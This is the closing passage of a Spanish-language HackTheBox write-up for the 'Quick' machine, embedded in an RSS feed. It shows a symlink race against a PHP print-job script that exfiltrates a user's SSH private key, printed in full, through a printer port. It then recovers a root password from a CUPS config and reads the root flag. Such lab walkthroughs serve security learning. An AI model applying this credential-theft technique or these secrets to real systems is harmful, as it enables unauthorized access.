	if(isset($_POST[&quot;submit&quot;]))
	{
		$title=$_POST[&quot;title&quot;];
		$file = date(&quot;Y-m-d_H:i:s&quot;);
		file_put_contents(&quot;/var/www/jobs/&quot;.$file,$_POST[&quot;desc&quot;]);
		chmod(&quot;/var/www/printer/jobs/&quot;.$file,&quot;0777&quot;);
		$stmt=$conn-&amp;gt;prepare(&quot;select ip,port from jobs&quot;);
		$stmt-&amp;gt;execute();
		$result=$stmt-&amp;gt;get_result();
		if($result-&amp;gt;num_rows &amp;gt; 0)
		{
			$row=$result-&amp;gt;fetch_assoc();
			$ip=$row[&quot;ip&quot;];
			$port=$row[&quot;port&quot;];
			try
			{
				$connector = new NetworkPrintConnector($ip,$port);
				sleep(0.5); //Buffer for socket check
				$printer = new Printer($connector);
				$printer -&amp;gt; text(file_get_contents(&quot;/var/www/jobs/&quot;.$file));
				$printer -&amp;gt; cut();
				$printer -&amp;gt; close();
				$message=&quot;Job assigned&quot;;
				unlink(&quot;/var/www/jobs/&quot;.$file);
			}
			catch(Exception $error) 
			{
				$error=&quot;Can't connect to printer.&quot;;
				unlink(&quot;/var/www/jobs/&quot;.$file);
			}
		}
		else
		{
			$error=&quot;Couldn't find printer.&quot;;
		}
	}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos aprovecharnos de este &lt;code&gt;sleep&lt;/code&gt;, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el &lt;code&gt;sleep&lt;/code&gt; puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello ejecutare la siguente instrucción.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/.ssh/id_rsa $fecha; break; fi; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Me pondre en escucha por el puerto &lt;code&gt;9100&lt;/code&gt; y agregare un contenido en &lt;code&gt;bill details&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos con exito la clave &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;srvadm&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44256.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
VA#            
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos conectamos como el usario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ chmod 600 id_rsa
❯ ssh -i id_rsa srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 17 01:32:15 UTC 2023

  System load:  0.18              Users logged in:                0
  Usage of /:   73.4% of 7.75GB   IP address for ens33:           10.10.10.186
  Memory usage: 17%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Processes:    191


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

52 packages can be updated.
27 updates are security updates.


Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
srvadm@quick:~$ whoami
srvadm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro los dos directios del usuario &lt;code&gt;srvadm&lt;/code&gt;, encontramos un archivo de configuración y al leerlo encontramos unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ find .
.
./conf.d
./conf.d/printers.conf
./conf.d/cupsd.conf
./logs
./logs/debug.log
./logs/error.log
./logs/cups.log
./packages
./motd.legal-displayed
srvadm@quick:~/.cache$ cat ./conf.d/printers.conf
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;MakeModel KONICA MINOLTA C554SeriesPS(P)
php &quot; DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
php &quot; State Idle&quot;);
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm@quick.htb:&amp;amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
State Idle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ su root
Password: 
root@quick:/home/srvadm/.cache# whoami
root
root@quick:/home/srvadm/.cache# cd /root/
root@quick:~# cat root.txt 
914fef2cca09448887142468da0f2136
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Maquina bastante guapa! 😃&lt;/p&gt;

</description>
        <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Quick</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Quick</guid>
        
        <category>http3</category>
        
        <category>Information leaked</category>
        
        <category>Bruteforce</category>
        
        <category>XSS Injection Esigate</category>
        
        <category>change password db</category>
        
        <category>Abusing Printer</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
